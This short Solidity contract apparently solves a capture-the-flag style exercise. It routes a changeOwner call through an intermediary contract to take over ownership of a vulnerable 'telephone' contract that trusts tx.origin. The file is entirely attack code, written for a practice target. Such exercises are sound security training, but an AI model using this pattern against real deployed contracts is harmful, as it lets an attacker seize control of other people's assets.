//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Quest04 {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    function takeover(address telephoneAddress, address newOwner)
        public
        onlyOwner
    {
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(address)",
            newOwner
        );
        telephoneAddress.call(payload);
    }
}